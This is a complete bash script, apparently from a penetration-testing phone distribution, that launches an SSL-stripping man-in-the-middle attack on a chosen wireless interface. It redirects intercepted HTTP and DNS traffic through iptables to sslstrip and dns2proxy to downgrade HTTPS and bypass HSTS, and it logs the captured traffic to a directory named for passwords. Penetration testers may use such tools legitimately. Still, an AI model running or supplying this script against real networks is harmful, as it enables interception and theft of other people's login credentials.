#!/bin/bash
# SSL strip script for sniffing on available interfaces
#set the prompt to the name of the script
PS1=${PS1//@\\h/@sslstrip}
clear

#this block controls the features for px_interface_selector
include_cell=1
require_ip=1
default_interface="at0"
. /opt/pwnix/pwnpad-scripts/px_functions.sh

# Cleanup function to ensure sslstrip stops and iptable rules stop
f_clean_up(){
  printf "\n[!] Killing other instances of sslstrip and flushing iptables\n\n"
  sslstrippid=$(pgrep -x sslstrip)
  dns2proxypid=$(pgrep -x dns2proxy.py)
  kill $sslstrippid $dns2proxypid > /dev/null 2>&1

  # Remove SSL Strip iptables rule ONLY
  iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
  iptables -t nat -D PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53

}

# Setup iptables for sslstrip
f_ip_tables(){
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
  iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
}

f_run(){
  # Path to sslstrip definitions
  printf "\nLogs saved to /opt/pwnix/captures/passwords/\n\n"
  sleep 2

  f_interface
  trap f_clean_up INT
  trap f_clean_up KILL

  f_ip_tables

  logfile=/opt/pwnix/captures/passwords/sslstrip_$(date +%F-%H%M).log

  if [ -f /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy.py ]; then
    cd /usr/share/mana-toolkit/sslstrip-hsts
    python /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy.py $interface &
  else
    printf "dns2proxy is currently unavailable\n"
  fi
  /usr/bin/sslstrip -pfk -w $logfile -l 8888 $interface
}

f_logging(){
  clear
  printf "\nWould you like to log data?\n\n"
  printf "Captures saved to /opt/pwnix/captures/passwords/\n\n"
  printf "1. Yes\n"
  printf "2. No\n\n"

  logchoice=$(f_one_or_two)
}

cd /opt/pwnix/captures/passwords &> /dev/null
f_logging
f_run
f_clean_up
